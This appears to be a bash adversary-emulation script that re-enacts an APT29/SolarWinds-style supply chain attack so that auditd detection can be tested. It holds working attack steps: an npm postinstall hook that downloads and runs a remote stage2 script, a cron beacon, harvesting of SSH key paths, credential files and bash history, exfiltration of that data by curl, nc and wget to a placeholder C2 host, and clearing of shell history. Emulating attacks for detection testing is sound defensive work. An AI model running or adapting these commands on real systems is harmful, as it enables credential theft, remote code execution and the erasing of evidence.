#!/bin/bash
#############################################################################
# Scenario 1: APT29 Supply Chain Attack Simulation
# 
# Based on: SolarWinds compromise (2020)
# Complexity: Medium
# Techniques: 8 MITRE ATT&CK techniques
# Duration: ~15 minutes
#
# ⚠️ WARNING: Run ONLY on isolated test systems!
#############################################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ATTACK_NAME="APT29_SupplyChain"
LOG_DIR="/tmp/apt_scenario1_logs"
C2_SERVER="192.168.100.200:8080"  # Simulated C2 (should not exist)
BACKDOOR_DIR="/tmp/.npm_cache"
EXFIL_DIR="/tmp/.system_$RANDOM"

echo -e "${GREEN}[*] Starting Scenario 1: APT29 Supply Chain Attack${NC}"
echo -e "${YELLOW}[!] This is a SIMULATION for testing purposes only${NC}"
echo -e "${YELLOW}[!] Ensure auditd is running to capture events${NC}"
echo

# Create directories
mkdir -p "$LOG_DIR"
mkdir -p "$BACKDOOR_DIR"
mkdir -p "$EXFIL_DIR"

# Record start time
START_TIME=$(date +%s)
echo "$START_TIME" > "$LOG_DIR/start_time.txt"
echo -e "${GREEN}[*] Attack start time: $(date)${NC}\n"

sleep 2

#############################################################################
# Technique 1: T1195.002 - Compromise Software Supply Chain
#############################################################################
echo -e "${GREEN}[T1195.002]${NC} Simulating malicious package download..."
cat > "$BACKDOOR_DIR/package.json" << 'EOF'
{
  "name": "suspicious-analytics",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "/bin/bash install.sh"
  }
}
EOF

cat > "$BACKDOOR_DIR/install.sh" << 'EOF'
#!/bin/bash
# Malicious install script
curl -s http://192.168.100.200:8080/stage2.sh -o /tmp/.npm_cache/stage2.sh 2>/dev/null || true
chmod +x /tmp/.npm_cache/stage2.sh 2>/dev/null || true
/tmp/.npm_cache/stage2.sh & 2>/dev/null || true
EOF

chmod +x "$BACKDOOR_DIR/install.sh"
sleep 1

#############################################################################
# Technique 2: T1059.004 - Unix Shell Execution
#############################################################################
echo -e "${GREEN}[T1059.004]${NC} Executing malicious shell script..."
# Simulate npm install triggering postinstall
cd "$BACKDOOR_DIR"
bash install.sh 2>/dev/null || true
cd - > /dev/null

sleep 2

#############################################################################
# Technique 3: T1053.003 - Scheduled Task/Job: Cron
#############################################################################
echo -e "${GREEN}[T1053.003]${NC} Creating persistence via cron..."
# Add malicious cron job (will be cleaned up)
CRON_CMD="*/15 * * * * /bin/bash $BACKDOOR_DIR/check.sh"
cat > "$BACKDOOR_DIR/check.sh" << 'EOF'
#!/bin/bash
# Backdoor check script
if [ ! -f /tmp/.npm_cache/.active ]; then
    curl -s http://192.168.100.200:8080/beacon 2>/dev/null || true
    touch /tmp/.npm_cache/.active
fi
EOF
chmod +x "$BACKDOOR_DIR/check.sh"

# Write to temp cron file (don't actually install to avoid persistence)
echo "$CRON_CMD" > "$LOG_DIR/cron_entry.txt"
echo -e "${YELLOW}[!] Cron job simulated (not actually installed)${NC}"

sleep 2

#############################################################################
# Technique 4: T1552.001 - Credentials in Files (SSH Keys)
#############################################################################
echo -e "${GREEN}[T1552.001]${NC} Searching for credentials..."
# Search for SSH keys
find ~/.ssh -type f 2>/dev/null | head -5 > "$EXFIL_DIR/ssh_files.txt" || true

# Search for credential files
find ~ -maxdepth 3 -name "*.pem" -o -name "*.key" -o -name "*credentials*" 2>/dev/null | head -10 > "$EXFIL_DIR/creds.txt" || true

# Simulate reading sensitive files
cat ~/.bash_history 2>/dev/null | tail -50 > "$EXFIL_DIR/history.txt" || echo "none" > "$EXFIL_DIR/history.txt"

sleep 2

#############################################################################
# Technique 5: T1082 - System Information Discovery
#############################################################################
echo -e "${GREEN}[T1082]${NC} Enumerating  system information..."
# Collect system info
uname -a > "$EXFIL_DIR/sysinfo.txt"
whoami >> "$EXFIL_DIR/sysinfo.txt"
id >> "$EXFIL_DIR/sysinfo.txt"
hostname >> "$EXFIL_DIR/sysinfo.txt"
uptime >> "$EXFIL_DIR/sysinfo.txt"
df -h >> "$EXFIL_DIR/sysinfo.txt"

# Network interfaces
ifconfig 2>/dev/null >> "$EXFIL_DIR/network.txt" || ip addr >> "$EXFIL_DIR/network.txt"

# Running processes
ps aux | head -20 > "$EXFIL_DIR/processes.txt"

sleep 2

#############################################################################
# Technique 6: T1005 - Data from Local System
#############################################################################
echo -e "${GREEN}[T1005]${NC} Collecting local data..."
# Simulate collecting sensitive documents
find ~ -maxdepth 3 -type f \( -name "*.pdf" -o -name "*.doc" -o -name "*.txt" \) 2>/dev/null | head -20 > "$EXFIL_DIR/documents.txt" || true

# Create archive
tar -czf "$EXFIL_DIR/collected_data.tar.gz" "$EXFIL_DIR/"*.txt 2>/dev/null || true

sleep 2

#############################################################################
# Technique 7: T1041 - Exfiltration Over C2 Channel
#############################################################################
echo -e "${GREEN}[T1041]${NC} Attempting exfiltration..."
# Simulate exfiltration (will fail but generate network events)
curl -X POST -F "data=@$EXFIL_DIR/collected_data.tar.gz" \
    http://$C2_SERVER/upload 2>/dev/null || echo -e "${YELLOW}[!] C2 unreachable (expected)${NC}"

# Alternative exfiltration methods
nc -w 1 192.168.100.200 443 < "$EXFIL_DIR/sysinfo.txt" 2>/dev/null || true
wget --post-file="$EXFIL_DIR/sysinfo.txt" http://$C2_SERVER/data 2>/dev/null || true

sleep 2

#############################################################################
# Technique 8: T1070.004 - Indicator Removal: File Deletion
#############################################################################
echo -e "${GREEN}[T1070.004]${NC} Cleaning up indicators..."
# Clear bash history (but keep backup for forensics)
cp ~/.bash_history "$LOG_DIR/bash_history_backup.txt" 2>/dev/null || true
echo "" > ~/.bash_history 2>/dev/null || true

# Remove sensitive log entries (simulated)
if [ -f /var/log/auth.log ]; then
    echo -e "${YELLOW}[!] Would clean auth.log (skipped for safety)${NC}"
fi

# Clean up temporary files
rm -f /tmp/curl_*  2>/dev/null || true
rm -f /tmp/wget_* 2>/dev/null || true

sleep 1

#############################################################################
# Attack Completion
#############################################################################
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo
echo -e "${GREEN}[*] ===== Attack Scenario 1 Completed =====${NC}"
echo -e "${GREEN}[*] Duration: ${DURATION} seconds${NC}"
echo -e "${GREEN}[*] Logs saved to: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Attack artifacts in: $BACKDOOR_DIR${NC}"
echo -e "${GREEN}[*] Exfil staging in: $EXFIL_DIR${NC}"
echo

# Generate summary
cat > "$LOG_DIR/attack_summary.txt" << EOF
APT29 Supply Chain Attack Simulation
=====================================
Start Time: $(date -d @$START_TIME 2>/dev/null || date -r $START_TIME)
End Time: $(date)
Duration: ${DURATION} seconds

MITRE ATT&CK Techniques Used:
1. T1195.002 - Compromise Software Supply Chain
2. T1059.004 - Unix Shell Execution
3. T1053.003 - Scheduled Task/Job: Cron
4. T1552.001 - Credentials in Files
5. T1082 - System Information Discovery
6. T1005 - Data from Local System
7. T1041 - Exfiltration Over C2 Channel
8. T1070.004 - Indicator Removal

Artifacts:
- Backdoor directory: $BACKDOOR_DIR
- Exfiltration staging: $EXFIL_DIR
- Logs: $LOG_DIR

Expected Detections:
- Suspicious npm/bash processes
- File creation in /tmp directories
- Attempted network connections to C2
- SSH key enumeration
- System discovery commands
- Data collection and archiving
- Log manipulation attempts

Cleanup Command:
bash $(dirname $0)/cleanup.sh
EOF

cat "$LOG_DIR/attack_summary.txt"

echo
echo -e "${YELLOW}[!] Remember to run cleanup: bash $(dirname $0)/cleanup.sh${NC}"
echo -e "${YELLOW}[!] Check auditd logs: sudo ausearch -ts recent${NC}"
echo
